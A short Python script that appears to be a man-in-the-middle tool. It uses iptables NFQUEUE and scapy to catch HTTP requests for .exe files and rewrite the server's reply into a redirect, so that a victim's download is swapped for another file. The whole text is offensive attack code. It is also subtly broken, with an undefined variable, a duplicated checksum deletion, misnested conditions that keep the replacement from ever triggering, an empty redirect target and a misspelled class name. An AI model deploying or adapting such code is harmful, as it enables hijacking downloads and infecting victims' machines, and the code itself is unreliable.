#!usr/bin/python
# note run IP TABLES TO FORWARD REQUESTS
# commands:
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0


import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.IP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] EXE REQUEST FOUNDED")
                ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] REPLACING THE EXE FILE")
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation:\n\n")
                    packet.set_payload(str(modified_packet))
                    packet.accept()


queue = netfilterqueue.Netfilterqueue()
queue.bind(0, process_packet)
queue.run()